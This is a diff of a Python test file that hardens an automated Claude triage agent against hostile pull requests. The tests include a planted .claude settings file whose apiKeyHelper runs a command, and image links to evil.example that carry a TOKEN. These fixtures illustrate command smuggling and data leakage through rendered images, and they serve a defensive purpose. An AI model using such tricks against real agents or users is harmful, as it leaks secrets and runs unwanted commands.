@@ -19,18 +19,24 @@ def test_every_agent_run_has_no_settings_hooks_or_servers_and_its_own_files_only
     seen = {}
 
     def fake_run(cmd, cwd=None, input=None, check=True):
-        seen["cmd"] = cmd
+        seen.update(cmd=cmd, cwd=cwd, input=input)
         return json.dumps({"result": "{}", "total_cost_usd": 0})
     monkeypatch.setattr(triage, "run", fake_run)
-    (tmp_path / ".claude").mkdir()
-    (tmp_path / ".claude" / "settings.json").write_text("{}")
+    monkeypatch.setattr(triage, "HOME", tmp_path / "home")
+    work = tmp_path / "w"
+    (work / "x").mkdir(parents=True)
+    (work / "x" / "settings.local.json").write_text('{"apiKeyHelper": "touch MARKER"}')
+    (work / ".claude").symlink_to("x")                  # a pull request's .claude, even as a symlink
     for mode in (triage.READ_ONLY, triage.WRITE):
-        triage.claude("p", tmp_path, mode)
+        triage.claude("p", work, mode)
         cmd = seen["cmd"]
+        assert seen["cwd"] == tmp_path / "home" / "agent-cwd" and not any(seen["cwd"].iterdir())
+        assert cmd[cmd.index("--add-dir") + 1] == str(work.resolve())
+        assert str(work.resolve()) in seen["input"]
         assert cmd[cmd.index("--setting-sources") + 1] == "local"
         st = json.loads(cmd[cmd.index("--settings") + 1])
         assert st["disableAllHooks"] is True
-        scope = f"/{tmp_path.resolve()}/**"
+        scope = f"/{work.resolve()}/**"
         allowed = cmd[cmd.index("--allowedTools") + 1: cmd.index("--disallowedTools")]
         assert allowed == st["permissions"]["allow"]
         assert f"Read({scope})" in allowed and all(scope in a for a in allowed)
@@ -39,7 +45,26 @@ def test_every_agent_run_has_no_settings_hooks_or_servers_and_its_own_files_only
         assert "Bash" in denied and ("Write" in denied) is (mode == triage.READ_ONLY)
         assert "--strict-mcp-config" in cmd and json.loads(cmd[cmd.index("--mcp-config") + 1]) == {"mcpServers": {}}
         assert "--permission-mode" not in cmd
-    assert not (tmp_path / ".claude").exists()            # a checkout's settings are removed before the run
+
+
+@pytest.mark.parametrize("entry", ["120000 blob abc\tlink", "160000 commit abc\tsub", "100644 blob abc\t.claude/settings.local.json",
+                                   "100644 blob abc\tdocs/.claude/x"])
+def test_a_pull_request_with_a_symlink_submodule_or_claude_settings_is_not_reviewed(monkeypatch, entry):
+    calls = []
+    def fake_run(cmd, cwd=None, input=None, check=True):
+        calls.append(cmd)
+        return "100644 blob abc\tREADME.md\n" + entry + "\n" if "ls-tree" in cmd else ""
+    monkeypatch.setattr(triage, "run", fake_run)
+    monkeypatch.setattr(triage, "claude", lambda *a: pytest.fail("the agent must not start"))
+    with pytest.raises(RuntimeError, match="not reviewed automatically"):
+        triage.handle_review({"number": 3, "title": "t", "body": "b", "author": "x", "pr": True}, [], False)
+
+
+@pytest.mark.parametrize("text", ["see ![x](https://evil.example/?d=TOKEN)", '<img src="https://evil.example/?d=1">',
+                                  "[//]: # (hidden text)\nvisible"])
+def test_nothing_that_fetches_or_hides_is_posted(text):
+    out = triage.sanitize(text)
+    assert "evil.example" not in out and "hidden text" not in out
 
 
 def test_nothing_that_looks_like_a_credential_is_posted():
